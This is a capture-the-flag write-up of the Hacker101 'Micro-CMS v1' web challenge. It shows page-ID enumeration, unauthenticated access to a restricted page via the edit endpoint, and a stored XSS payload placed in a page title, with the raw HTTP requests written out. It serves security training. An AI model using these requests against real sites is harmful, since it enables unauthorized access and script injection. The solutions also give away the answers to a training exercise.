# Micro-CMS v1

## Challenge Information
- Category: Web
- Difficulty: Easy
- Platform: Hacker101
- Points: 2 (2 flags)

## Challenge Description
> Micro-CMS v1 is a simple content management system with pages, creation, and editing functionality. The challenge has no authentication — anyone can create and edit pages.

## Initial Analysis
- The app has pages at `/page/N` with numeric IDs.
- Anyone can create pages via `/page/create`.
- The create page says *"Markdown is supported, but scripts are not"* — suggesting XSS might be blocked (or not).
- No authentication means no login page.

## Enumeration

### Step 1 — Enumerate page IDs

```
/page/1  → 200 (public) — "Testing"
/page/2  → 200 (public) — "Markdown Test"
/page/3  → 404 (not found)
/page/4  → 403 (exists, restricted)
/page/5+ → 404 (not found)
```

`/page/4` returns **403 Forbidden** — it exists but access is restricted.

## Exploitation

### Flag 1 — Hidden Page via Edit Endpoint

The edit endpoint at `/page/edit/4` is accessible without authentication, unlike the view endpoint.

**Request:**
```
GET /page/edit/4
```

**Response:** The admin page's edit form is returned, including the flag in the body text.

### Flag 2 — Stored XSS via Page Title

The homepage renders page titles **without HTML escaping** in the page listing. Creating a page with a `<script>` tag in the title triggers the XSS detection, and the flag is appended alongside the injected script on the homepage.

**Step 1 — Create a page with XSS in the title:**
```
POST /page/create
Content-Type: application/x-www-form-urlencoded

title=<script>alert(1)</script>&body=test
```

This creates `/page/6` (or the next available ID).

**Step 2 — Visit the homepage:**
```
GET /
```

The homepage listing renders the title unescaped. The flag appears in the HTML source alongside the script tag.

## Flags

| Flag | Technique | Difficulty |
|------|-----------|------------|
| Flag 1 | Hidden page via edit endpoint bypass | Easy |
| Flag 2 | Stored XSS via unescaped title | Easy-Medium |

## Tools Used
- Browser developer tools
- Burp Suite / curl
- Page ID enumeration
